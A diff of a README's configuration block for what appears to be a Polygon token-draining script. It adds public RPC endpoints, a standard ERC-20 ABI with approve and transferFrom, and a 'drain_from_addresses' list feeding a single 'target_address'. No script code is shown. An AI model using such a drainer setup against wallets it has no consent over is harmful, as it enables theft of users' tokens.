@@ -27,16 +27,138 @@ Before running this script, ensure you have the following installed:
 
   ```bash
 {
-  "rpc_url": "https://rpc.maticvigil.com/v1",
   "private_key": "YOUR_PRIVATE_KEY",
   "my_address": "YOUR_ADDRESS",
   "token_address": "TOKEN_ADDRESS",
-  "drain_from_addresses": ["WALLET_1", "WALLET_2", "WALLET_3", "WALLET_4"],
   "target_address": "TARGET_WALLET",
-  "api_key": "YOUR_API_KEY",
-  "scan_api_url": "https://api.polygonscan.com/api",
-  "chain_id": 137
+  "rpc_urls": [
+    "https://polygon-pokt.nodies.app",
+    "https://polygon.meowrpc.com",
+    "https://polygon-bor-rpc.publicnode.com",
+    "https://polygon.drpc.org",
+    "https://1rpc.io/matic"
+  ],
+  "erc20_abi": [
+    {
+      "constant": true,
+      "inputs": [],
+      "name": "name",
+      "outputs": [
+        {
+          "name": "",
+          "type": "string"
+        }
+      ],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "constant": false,
+      "inputs": [
+        {
+          "name": "_spender",
+          "type": "address"
+        },
+        {
+          "name": "_value",
+          "type": "uint256"
+        }
+      ],
+      "name": "approve",
+      "outputs": [
+        {
+          "name": "",
+          "type": "bool"
+        }
+      ],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "constant": true,
+      "inputs": [],
+      "name": "totalSupply",
+      "outputs": [
+        {
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "constant": false,
+      "inputs": [
+        {
+          "name": "_from",
+          "type": "address"
+        },
+        {
+          "name": "_to",
+          "type": "address"
+        },
+        {
+          "name": "_value",
+          "type": "uint256"
+        }
+      ],
+      "name": "transferFrom",
+      "outputs": [
+        {
+          "name": "",
+          "type": "bool"
+        }
+      ],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "constant": true,
+      "inputs": [
+        {
+          "name": "_owner",
+          "type": "address"
+        }
+      ],
+      "name": "balanceOf",
+      "outputs": [
+        {
+          "name": "balance",
+          "type": "uint256"
+        }
+      ],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "constant": true,
+      "inputs": [],
+      "name": "decimals",
+      "outputs": [
+        {
+          "name": "",
+          "type": "uint8"
+        }
+      ],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ],
+  "drain_from_addresses": [
+    "WALLET_1",
+    "WALLET_2",
+    "WALLET_3",
+    "WALLET_4"
+  ]
 }
+
  ```
 
 ## Ensure your Polygon (Matic) RPC URL and API key are valid and accessible.
